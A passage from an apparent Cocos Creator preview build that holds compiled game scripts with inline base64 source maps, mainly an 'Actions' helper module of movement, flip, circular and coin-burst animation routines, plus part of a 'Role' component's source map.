DO1FBQzNCLENBQUM7YUFFRCxVQUFjLEtBQWU7WUFDekIsUUFBUSxLQUFLLEVBQUM7Z0JBQ1YsS0FBSyxTQUFTLENBQUMsSUFBSTtvQkFDZixJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxTQUFTLENBQUM7b0JBQzdCLE1BQU07Z0JBQ1YsS0FBSyxTQUFTLENBQUMsTUFBTTtvQkFDakIsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsV0FBVyxDQUFDO29CQUMvQixNQUFNO2dCQUNWLEtBQUssU0FBUyxDQUFDLElBQUk7b0JBQ2YsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsU0FBUyxDQUFDO29CQUM3QixNQUFNO2FBQ2I7WUFDRCxJQUFJLENBQUMsVUFBVSxHQUFHLEtBQUssQ0FBQztRQUM1QixDQUFDOzs7T0FmQTtJQTZCRCxxQkFBTSxHQUFOO1FBQ0ksSUFBSSxDQUFDLFNBQVMsR0FBRyxJQUFJLENBQUMsWUFBWSxDQUFDLGtCQUFRLENBQUMsQ0FBQztRQUM3QyxJQUFJLENBQUMsb0JBQW9CLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsY0FBYyxDQUFDLENBQUM7SUFDckUsQ0FBQztJQUdELFdBQVc7SUFDWCwrQkFBZ0IsR0FBaEIsVUFBa0IsS0FBSyxFQUFFLElBQUk7UUFDekIsWUFBWTtRQUNaLElBQUksS0FBSyxDQUFDLEdBQUcsSUFBSSxDQUFDLEVBQUM7WUFDZixPQUFPLENBQUMsR0FBRyxDQUFDLFNBQVMsQ0FBQyxDQUFDO1NBQzFCO0lBQ0wsQ0FBQztJQUVELHdCQUFTLEdBQVQsVUFBVSxFQUFTO1FBQ2YsSUFBSSxNQUFNLEdBQUcsRUFBRSxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsbUJBQW1CLEVBQUUsRUFBRSxDQUFDLE1BQU0sQ0FBQyxDQUFDO1FBQzlELElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDbEMsSUFBSSxDQUFDLFlBQVksQ0FBQyxvQkFBVSxDQUFDLENBQUMsU0FBUyxDQUFDLEVBQUUsRUFBRSxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUM7UUFDdkQsSUFBSSxDQUFDLElBQUksQ0FBQyxTQUFTLEVBQUUsQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUM7SUFDekMsQ0FBQztJQS9FRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDOzRDQUNRO0lBRzVCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7NENBQ1E7SUFHMUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzs0Q0FDUTtJQXVCMUI7UUFEQyxRQUFRLENBQUMsRUFBQyxJQUFJLEVBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxPQUFPLEVBQUMsTUFBTSxFQUFDLENBQUM7eUNBR25EO0lBa0JEO1FBREMsUUFBUSxDQUFDLEVBQUMsT0FBTyxFQUFDLE9BQU8sRUFBQyxDQUFDOzJDQUNkO0lBR2Q7UUFEQyxRQUFRLENBQUMsRUFBQyxPQUFPLEVBQUMsTUFBTSxFQUFDLENBQUM7NkNBQ1Q7SUFHbEI7UUFEQyxRQUFRLENBQUMsRUFBQyxPQUFPLEVBQUMsTUFBTSxFQUFDLENBQUM7MkNBQ1g7SUFHaEI7UUFEQyxRQUFROzBDQUNJO0lBN0RJLElBQUk7UUFEeEIsT0FBTztPQUNhLElBQUksQ0FvRnhCO0lBQUQsV0FBQztDQXBGRCxBQW9GQyxDQXBGaUMsRUFBRSxDQUFDLFNBQVMsR0FvRjdDO2tCQXBGb0IsSUFBSSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5cclxuaW1wb3J0IFJvbGVBQUJCIGZyb20gXCIuL1JvbGVBQUJCXCI7XHJcbmltcG9ydCB7R2FtZVByb3h5fSBmcm9tIFwiLi4vLi4vZ2FtZS9HYW1lUHJveHlcIjtcclxuaW1wb3J0IFJvbGVTdXBwbHkgZnJvbSBcIi4vUm9sZVN1cHBseVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5leHBvcnQgZW51bSBTcGVlZFR5cGUge1xyXG4gICAgU1RPUCxcclxuICAgIE5PUk1BTCxcclxuICAgIEZBU1QsXHJcbn1cclxuXHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBSb2xlIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgZmlyZVNwcml0ZTpjYy5TcHJpdGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZ3VuVG9wTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHNwcml0ZU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgcHJpdmF0ZSBfc3BlZWRUeXBlOlNwZWVkVHlwZSA9IFNwZWVkVHlwZS5TVE9QO1xyXG4gICAgcHJpdmF0ZSBfc3BlZWQgPSAwO1xyXG5cclxuICAgIHByaXZhdGUgX3JvbGVBQUJCOlJvbGVBQUJCID0gbnVsbDtcclxuXHJcbiAgICBwcml2YXRlIF9zcGFjZUNpcmNsZUNvbGxpZGVyOmNjLkNpcmNsZUNvbGxpZGVyID0gbnVsbDtcclxuXHJcblxyXG4gICAgZ2V0IHNwYWNlQ2lyY2xlQ29sbGlkZXIoKTogY2MuQ2lyY2xlQ29sbGlkZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9zcGFjZUNpcmNsZUNvbGxpZGVyO1xyXG4gICAgfVxyXG5cclxuICAgIGdldCByb2xlQUFCQigpOiBSb2xlQUFCQiB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX3JvbGVBQUJCO1xyXG4gICAgfVxyXG5cclxuICAgIGdldCBzcGVlZCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9zcGVlZCp0aGlzLmFjY1NwZWVkO1xyXG4gICAgfVxyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5FbnVtKFNwZWVkVHlwZSksIHRvb2x0aXA6XCLpgJ/luqbnuqfliKtcIn0pXHJcbiAgICBnZXQgc3BlZWRUeXBlKCl7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX3NwZWVkVHlwZTtcclxuICAgIH1cclxuXHJcbiAgICBzZXQgc3BlZWRUeXBlKHZhbHVlOlNwZWVkVHlwZSl7XHJcbiAgICAgICAgc3dpdGNoICh2YWx1ZSl7XHJcbiAgICAgICAgICAgIGNhc2UgU3BlZWRUeXBlLlNUT1A6XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9zcGVlZCA9IHRoaXMuc3RvcFNwZWVkO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgU3BlZWRUeXBlLk5PUk1BTDpcclxuICAgICAgICAgICAgICAgIHRoaXMuX3NwZWVkID0gdGhpcy5ub3JtYWxTcGVlZDtcclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICBjYXNlIFNwZWVkVHlwZS5GQVNUOlxyXG4gICAgICAgICAgICAgICAgdGhpcy5fc3BlZWQgPSB0aGlzLmZhc3RTcGVlZDtcclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLl9zcGVlZFR5cGUgPSB2YWx1ZTtcclxuICAgIH1cclxuXHJcbiAgICBAcHJvcGVydHkoe3Rvb2x0aXA6XCLlgZzmraLml7bpgJ/luqZcIn0pXHJcbiAgICBzdG9wU3BlZWQgPSAwO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dG9vbHRpcDpcIuato+W4uOmAn+W6plwifSlcclxuICAgIG5vcm1hbFNwZWVkID0gMTAwO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dG9vbHRpcDpcIuacgOW/q+mAn+W6plwifSlcclxuICAgIGZhc3RTcGVlZCA9IDIwMDtcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGFjY1NwZWVkID0gMTtcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLl9yb2xlQUFCQiA9IHRoaXMuZ2V0Q29tcG9uZW50KFJvbGVBQUJCKTtcclxuICAgICAgICB0aGlzLl9zcGFjZUNpcmNsZUNvbGxpZGVyID0gdGhpcy5nZXRDb21wb25lbnQoY2MuQ2lyY2xlQ29sbGlkZXIpO1xyXG4gICAgfVxyXG5cclxuc1xyXG4gICAgLyoqIOeisOaSnuWkhOeQhiAqL1xyXG4gICAgb25Db2xsaXNpb25FbnRlciAob3RoZXIsIHNlbGYpIHtcclxuICAgICAgICAvKiog5aaC5p6c5piv5oCq54mpICovXHJcbiAgICAgICAgaWYgKG90aGVyLnRhZyA9PSAxKXtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coXCLop5LoibLooqvmlLvlh7vkuoYuXCIpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBhZGRTdXBwbHkoaWQ6bnVtYmVyKXtcclxuICAgICAgICBsZXQgcHJlZmFiID0gY2MubG9hZGVyLmdldFJlcygncHJlZmFiL3JvbGVTdXBwbHknLCBjYy5QcmVmYWIpO1xyXG4gICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUocHJlZmFiKTtcclxuICAgICAgICBub2RlLmdldENvbXBvbmVudChSb2xlU3VwcGx5KS5zZXRTdXBwbHkoaWQsIHRoaXMubm9kZSk7XHJcbiAgICAgICAgdGhpcy5ub2RlLmdldFBhcmVudCgpLmFkZENoaWxkKG5vZGUpO1xyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/actions/Actions.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '9b462XreAtDoJefQPMuD8lR', 'Actions');
// framework/actions/Actions.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Actions = /** @class */ (function () {
    function Actions() {
    }
    /** 向下移动 */
    Actions.downward = function (speed, height) {
        return cc.moveBy(height / speed, cc.v2(0, -height));
    };
    /** 向上移动 */
    Actions.upward = function (speed, height) {
        return cc.moveBy(height / speed, cc.v2(0, height));
    };
    /** 周期性动作 */
    Actions.cycleAction = function (action, startValue, endValue, deltaValue, speed, times, damping, cycleDelay) {
        if (damping === void 0) { damping = 0; }
        if (cycleDelay === void 0) { cycleDelay = 0; }
        var deltaValue_abs = Math.abs(deltaValue);
        var actions = [];
        actions.push(action(deltaValue_abs / speed, startValue + deltaValue));
        if (cycleDelay > 0) {
            actions.push(cc.delayTime(cycleDelay));
        }
        for (var i = 0; i < times; i++) {
            var newDeltaRotation = deltaValue_abs - (i * damping);
            var duation = newDeltaRotation * 2 / speed;
            var rotation = newDeltaRotation;
            if (deltaValue > 0) {
                if (i % 2 == 0) {
                    rotation = -rotation;
                }
            }
            else {
                if (i % 2 == 1) {
                    rotation = -rotation;
                }
            }
            actions.push(action(duation, startValue + rotation));
            if (cycleDelay > 0 && i % 2 == 1) {
                actions.push(cc.delayTime(cycleDelay));
            }
        }
        var lastValue = deltaValue_abs - (times - 1) * damping;
        if (deltaValue > 0) {
            if (times % 2 == 0) {
                lastValue = -lastValue;
            }
        }
        else {
            if (times % 2 == 1) {
                lastValue = -lastValue;
            }
        }
        actions.push(action(Math.abs(endValue - (startValue + lastValue)) / speed, endValue));
        return cc.sequence(actions);
    };
    /** 延迟执行 */
    Actions.delayTimeCall = function (delay, call) {
        return cc.sequence(cc.delayTime(delay), cc.callFunc(call));
    };
    /** 循环任务 */
    Actions.scheduleCall = function (interval, call) {
        if (typeof call == "function") {
            return cc.repeatForever(cc.sequence(cc.delayTime(interval), cc.callFunc(call)));
        }
        else {
            return cc.repeatForever(cc.sequence(cc.delayTime(interval), call));
        }
    };
    /** 每一帧执行 */
    Actions.update = function (call) {
        return this.scheduleCall(0, function () {
            call(cc.director.getDeltaTime());
        });
    };
    /** 高亮显示动作（先放大再缩小,适合更换字体时调用） */
    Actions.highlightAction = function (maxScaleCall) {
        var call = function () {
            if (maxScaleCall)
                maxScaleCall();
        };
        var seq = cc.sequence([
            cc.scaleTo(0.1, 1.4),
            cc.callFunc(call),
            cc.scaleTo(0.07, 0.8),
            cc.scaleTo(0.07, 1.1),
            cc.scaleTo(0.07, 0.9),
            cc.scaleTo(0.07, 1),
        ]);
        return seq;
    };
    /** 飘动显示效果(适合显示label提示，类似toast) */
    Actions.flutterAction = function () {
        var moveSeq = cc.sequence([
            cc.moveBy(0.6, cc.v2(0, 0)),
            cc.moveBy(1, cc.v2(0, 84))
        ]);
        var scaleSeq = cc.sequence([
            cc.scaleTo(0.1, 1.2),
            cc.scaleTo(0.1, 0.8),
            cc.scaleTo(0.1, 1),
        ]);
        var alphaSeq = cc.sequence([
            cc.fadeTo(0.8, 255),
            cc.fadeTo(0.8, 0),
        ]);
        var spawn = cc.spawn(moveSeq, scaleSeq, alphaSeq);
        return spawn;
    };
    /**
     * 圆运动
     * @param {Number} duration
     * @param {cc.Node|cc.p} dot 圆心点坐标或者node
     * @param {Number}   半径 如果为负数, 反时钟方向
     * @param {Number}  旋转角度
     * @returns {cc.CardinalSplineTo}
     */
    Actions.circleBy = function (duration, dot, r, angle) {
        var dp = angle || 20, dpr = 360 / dp, ary = [];
        r = r || 20;
        if (r < 0)
            dpr = -dpr;
        r = Math.abs(r);
        var rad = Math.PI / 180;
        for (var i = 0; i < dp; i++) {
            ary.push(cc.v2(Math.sin(dpr * i * rad) * r + dot.x, Math.cos(dpr * i * rad) * r + dot.y));
        }
        ary.push(ary);
        return cc.cardinalSplineTo(duration, ary, 0);
    };
    ;
    /**
     * 伪3D的翻转动作
     * @param {number} duration
     * @param {number} skewY
     * @return {cc.FiniteTimeAction}
     */
    Actions.flipXAction = function (duration, skewY) {
        if (duration === void 0) { duration = 0.5; }
        if (skewY === void 0) { skewY = 10; }
        var speed = duration / 38;
        var scale = cc.sequence(cc.scaleTo(speed * 9, 0.1, 1), cc.scaleTo(speed * 2, -0.1, 1), cc.scaleTo(speed * 8, -0.9, 1), cc.scaleTo(speed * 8, -0.1, 1), cc.scaleTo(speed * 2, 0.1, 1), cc.scaleTo(speed * 9, 1, 1));
        var skew = cc.sequence(cc.skewTo(speed * 9, 0, -skewY), cc.skewTo(speed * 2, 0, -skewY), cc.skewTo(speed * 8, 0, 0), cc.skewTo(speed * 8, 0, skewY), cc.skewTo(speed * 2, 0, skewY), cc.skewTo(speed * 9, 0, 0));
        return cc.spawn(scale, skew);
    };
    /**
     * 炸出金币的效果
     * @param {cc.Node} prefabNode
     * @param {cc.Node} parent
     * @param {cc.Vec2} startPos
     * @param {cc.Vec2} endPos
     * @param {number} radius
     * @param {number} num
     * @param {number} moveSpeed
     */
    Actions.boom = function (createNode, startPos, endPos, radius, num, moveSpeed, callback) {
        if (moveSpeed === void 0) { moveSpeed = 2000; }
        var list = [];
        var promise = [];
        var _loop_1 = function (i) {
            promise.push(new Promise(function (resolve, reject) {
                var node = createNode();
                node.position = startPos;
                list.push(node);
                /** 炸开动作 */
                var angle = i * 360 / num - 45;
                // node.rotation = 45+angle;
                /** 计算向量 */
                var normal = cc.v2(1, 1).rotateSelf(-angle * Math.PI / 180);
                var position = normal.mul(radius);
                var boomSpeed = 500;
                node.runAction(cc.sequence(cc.moveBy(radius / boomSpeed, position).easing(cc.easeExponentialOut()), cc.callFunc(function () {
                    /** 移动 */
                    resolve();
                })));
                // node.runAction(cc.repeatForever(Actions.flipXAction(i%2==0?1:0.9)));
                // node.getComponent(cc.Animation).play(null, i%2==0?0:0.2);
            }));
        };
        for (var i = 0; i < num; i++) {
            _loop_1(i);
        }
        Promise.all(promise).then(function (res) {
            /** 分成两部分 */
            var halfNum = Math.floor(num / 2);
            var _loop_2 = function (i) {
                var node = list[i];
                var sub = endPos.sub(node.position);
                var moveTime = sub.mag() / moveSpeed;
                var center = node.position.add(sub.mul(0.5));
                var p = sub.normalize().rotate(-90 * Math.PI / 180);
                var toAction = cc.bezierTo(moveTime, [
                    center.add(p.mul(200)),
                    endPos,
                    endPos
                ]);
                node.runAction(cc.sequence(cc.delayTime(i * 0.08), cc.spawn(toAction.easing(cc.easeSineOut()), cc.scaleTo(moveTime, 0.5), cc.fadeTo(moveTime, 80)), cc.callFunc(function () {
                    node.active = false;
                    if (callback) {
                        callback();
                    }
                })));
            };
            for (var i = 0; i < halfNum; i++) {
                _loop_2(i);
            }
            var _loop_3 = function (i) {
                var node = list[list.length - 1 - i];
                var sub = endPos.sub(node.position);
                var moveTime = sub.mag() / moveSpeed;
                var center = node.position.add(sub.mul(0.5));
                var p = sub.normalize().rotate(-90 * Math.PI / 180);
                var toAction = cc.bezierTo(moveTime, [
                    center.add(p.mul(-200)),
                    endPos,
                    endPos
                ]);
                node.runAction(cc.sequence(cc.delayTime(i * 0.08), cc.spawn(toAction.easing(cc.easeSineOut()), cc.scaleTo(moveTime, 0.5), cc.fadeTo(moveTime, 80)), cc.callFunc(function () {
                    node.active = false;
                    if (callback) {
                        callback();
                    }
                })));
            };
            for (var i = 0; i < list.length - halfNum; i++) {
                _loop_3(i);
            }
        });
    };
    return Actions;
}());
exports.default = Actions;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvYWN0aW9ucy9BY3Rpb25zLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQUduRztJQUFBO0lBcVBBLENBQUM7SUFuUEcsV0FBVztJQUNKLGdCQUFRLEdBQWYsVUFBZ0IsS0FBYSxFQUFFLE1BQWM7UUFDekMsT0FBTyxFQUFFLENBQUMsTUFBTSxDQUFDLE1BQU0sR0FBRyxLQUFLLEVBQUUsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDO0lBQ3hELENBQUM7SUFFRCxXQUFXO0lBQ0osY0FBTSxHQUFiLFVBQWMsS0FBYSxFQUFFLE1BQWM7UUFDdkMsT0FBTyxFQUFFLENBQUMsTUFBTSxDQUFDLE1BQU0sR0FBRyxLQUFLLEVBQUUsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsTUFBTSxDQUFDLENBQUMsQ0FBQztJQUN2RCxDQUFDO0lBRUQsWUFBWTtJQUNMLG1CQUFXLEdBQWxCLFVBQW1CLE1BQWdCLEVBQUUsVUFBa0IsRUFBRSxRQUFnQixFQUFFLFVBQWtCLEVBQUUsS0FBYSxFQUFFLEtBQWEsRUFBRSxPQUFtQixFQUFFLFVBQXNCO1FBQTNDLHdCQUFBLEVBQUEsV0FBbUI7UUFBRSwyQkFBQSxFQUFBLGNBQXNCO1FBQ3BLLElBQUksY0FBYyxHQUFHLElBQUksQ0FBQyxHQUFHLENBQUMsVUFBVSxDQUFDLENBQUM7UUFDMUMsSUFBSSxPQUFPLEdBQTBCLEVBQUUsQ0FBQztRQUN4QyxPQUFPLENBQUMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxjQUFjLEdBQUcsS0FBSyxFQUFFLFVBQVUsR0FBRyxVQUFVLENBQUMsQ0FBQyxDQUFDO1FBQ3RF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